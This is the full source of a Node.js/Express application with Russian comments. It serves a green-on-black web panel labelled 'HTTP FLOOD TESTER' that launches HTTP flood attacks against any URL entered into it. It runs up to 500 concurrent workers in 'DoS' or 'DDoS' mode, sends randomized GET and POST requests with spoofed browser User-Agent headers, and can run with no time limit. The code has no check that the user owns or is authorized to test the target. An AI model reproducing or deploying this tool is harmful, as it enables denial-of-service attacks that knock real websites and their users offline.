// Подключение необходимых модулей
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static('public')); // для статических файлов, если потребуется

// Глобальные переменные управления атакой
let attackActive = false;
let stopFlag = false;
let stats = {
  totalRequests: 0,
  success: 0,
  failed: 0,
  bytesSent: 0,
  active: false
};

// Генерация случайной строки заданной длины
function randomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Создание случайных заголовков для запроса
function randomHeaders() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0'
  ];
  return {
    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  };
}

// Функция одного потока: непрерывно отправляет запросы, пока не установлен stopFlag
async function floodWorker(target, mode) {
  const instance = axios.create({
    timeout: 3000,
    headers: randomHeaders(),
    validateStatus: () => true // не выбрасывать ошибку при любом статусе
  });
  
  while (!stopFlag) {
    try {
      let response;
      const methodRand = Math.random();
      if (methodRand < 0.7) { // GET запрос с случайным параметром
        const param = randomString(8);
        const url = `${target}?${param}=${Math.floor(Math.random() * 10000)}`;
        response = await instance.get(url);
      } else { // POST запрос с телом случайного размера
        const payloadSize = Math.floor(Math.random() * 4096) + 512; // 512-4608 байт
        const payload = { data: randomString(payloadSize) };
        response = await instance.post(target, payload);
      }
      stats.totalRequests++;
      stats.bytesSent += response.config.data ? Buffer.byteLength(response.config.data) : 0;
      if (response.status < 400) {
        stats.success++;
      } else {
        stats.failed++;
      }
    } catch (error) {
      stats.totalRequests++;
      stats.failed++;
      // Игнорируем ошибки сети, продолжаем
    }
    // В режиме DoS добавляем небольшую задержку между запросами
    if (mode === 'dos') {
      await new Promise(resolve => setTimeout(resolve, Math.random() * 50 + 10)); // 10-60 мс
    }
    // В режиме DDoS задержки нет — максимальная скорость
  }
}

// Запуск атаки с заданным числом параллельных воркеров (потоков)
function startAttack(target, threads, mode, duration) {
  if (attackActive) return { success: false, message: 'Атака уже запущена' };
  
  // Сброс статистики
  stats = { totalRequests: 0, success: 0, failed: 0, bytesSent: 0, active: true };
  attackActive = true;
  stopFlag = false;
  
  // Запускаем N воркеров (асинхронных функций без ожидания)
  for (let i = 0; i < threads; i++) {
    floodWorker(target, mode);
  }
  
  // Если задана длительность, автоматически остановить через указанное время
  if (duration > 0) {
    setTimeout(() => {
      stopFlag = true;
      attackActive = false;
      stats.active = false;
    }, duration * 1000);
  }
  
  return { success: true, message: `Атака запущена: ${threads} потоков, режим ${mode.toUpperCase()}` };
}

// Остановка атаки
function stopAttack() {
  if (!attackActive) return { success: false, message: 'Нет активной атаки' };
  stopFlag = true;
  attackActive = false;
  stats.active = false;
  return { success: true, message: 'Атака остановлена' };
}

// Маршруты веб-интерфейса
app.get('/', (req, res) => {
  // Отдаём HTML-интерфейс прямо из кода
  const html = `
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stress Tester Panel</title>
<style>
  body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
  .container { max-width: 700px; margin: 0 auto; }
  h1 { text-align: center; text-shadow: 0 0 10px #0f0; }
  .form-group { margin-bottom: 15px; }
  label { display: block; margin-bottom: 5px; }
  input, select, button { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; font-family: inherit; }
  input[type="text"], input[type="number"] { width: 100%; }
  button { cursor: pointer; margin-right: 10px; }
  button:hover { background: #0f0; color: #000; }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  .stats { border: 1px solid #0f0; padding: 15px; margin-top: 20px; }
  .stats span { font-weight: bold; }
  .slider-container { display: flex; align-items: center; }
  input[type="range"] { flex: 1; margin-right: 10px; }
</style>
</head>
<body>
<div class="container">
  <h1>⚡ HTTP FLOOD TESTER ⚡</h1>
  <div class="form-group">
    <label>Целевой URL</label>
    <input type="text" id="target" value="http://example.com" placeholder="http://...">
  </div>
  <div class="form-group">
    <label>Количество потоков (мощность)</label>
    <div class="slider-container">
      <input type="range" id="threadsSlider" min="10" max="500" value="100" oninput="document.getElementById('threadsVal').textContent=this.value">
      <span id="threadsVal">100</span>
    </div>
  </div>
  <div class="form-group">
    <label>Режим атаки</label>
    <select id="mode">
      <option value="dos">DoS (умеренный)</option>
      <option value="ddos">DDoS (максимальный)</option>
    </select>
  </div>
  <div class="form-group">
    <label>Длительность (секунд, 0 = бесконечно)</label>
    <input type="number" id="duration" value="0" min="0">
  </div>
  <div>
    <button id="startBtn" onclick="start()">ЗАПУСТИТЬ</button>
    <button id="stopBtn" onclick="stop()" disabled>СТОП</button>
  </div>
  <div class="stats">
    <p>Всего запросов: <span id="req">0</span></p>
    <p>Успешных: <span id="suc">0</span></p>
    <p>Ошибок: <span id="err">0</span></p>
    <p>Отправлено байт: <span id="bytes">0</span></p>
    <p>Статус: <span id="status">Ожидание</span></p>
  </div>
</div>
<script>
  function start() {
    const target = document.getElementById('target').value;
    const threads = document.getElementById('threadsSlider').value;
    const mode = document.getElementById('mode').value;
    const duration = document.getElementById('duration').value;
    
    fetch('/api/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target, threads: parseInt(threads), mode, duration: parseInt(duration) })
    })
    .then(r => r.json())
    .then(d => {
      if (d.status === 'ok') {
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
      } else {
        alert(d.message);
      }
    });
  }
  
  function stop() {
    fetch('/api/stop')
    .then(r => r.json())
    .then(d => {
      if (d.status === 'ok') {
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
      }
    });
  }
  
  // Обновление статистики каждую секунду
  setInterval(() => {
    fetch('/api/stats')
    .then(r => r.json())
    .then(s => {
      document.getElementById('req').textContent = s.totalRequests;
      document.getElementById('suc').textContent = s.success;
      document.getElementById('err').textContent = s.failed;
      document.getElementById('bytes').textContent = s.bytesSent;
      document.getElementById('status').textContent = s.active ? 'АКТИВНА' : 'Остановлена';
      document.getElementById('status').style.color = s.active ? '#ff0' : '#0f0';
    });
  }, 1000);
</script>
</body>
</html>`;
  res.send(html);
});

// API endpoints
app.post('/api/start', (req, res) => {
  const { target, threads, mode, duration } = req.body;
  if (!target || !target.startsWith('http')) {
    return res.json({ status: 'error', message: 'Некорректный URL' });
  }
  const result = startAttack(target, threads || 100, mode || 'ddos', duration || 0);
  res.json({ status: result.success ? 'ok' : 'error', message: result.message });
});

app.get('/api/stop', (req, res) => {
  const result = stopAttack();
  res.json({ status: result.success ? 'ok' : 'error', message: result.message });
});

app.get('/api/stats', (req, res) => {
  res.json(stats);
});

// Запуск сервера на порту, указанном Render (или 3000 по умолчанию)
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Stress tester running on port ${PORT}`);
});
